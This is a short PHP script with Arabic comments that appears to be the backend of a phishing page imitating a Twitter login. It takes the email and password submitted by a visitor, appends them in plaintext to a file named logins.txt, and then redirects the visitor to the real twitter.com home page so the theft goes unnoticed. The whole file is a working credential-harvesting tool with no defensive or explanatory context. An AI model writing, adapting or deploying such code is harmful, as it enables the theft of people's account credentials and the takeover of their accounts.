<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // أدخل الكود هنا لحفظ البريد الإلكتروني وكلمة المرور في ملف أو قاعدة بيانات
    // قم بتخصيصه وفقًا لاحتياجاتك الخاصة
    // في هذا المثال، سنقوم بحفظهما في ملف نصي
    $data = "Email: $email, Password: $password\n";
    file_put_contents("logins.txt", $data, FILE_APPEND | LOCK_EX);
    
    // قم بتوجيه المستخدم إلى الموقع الآخر
    header("Location: https://twitter.com/home");
    exit();
}
?>
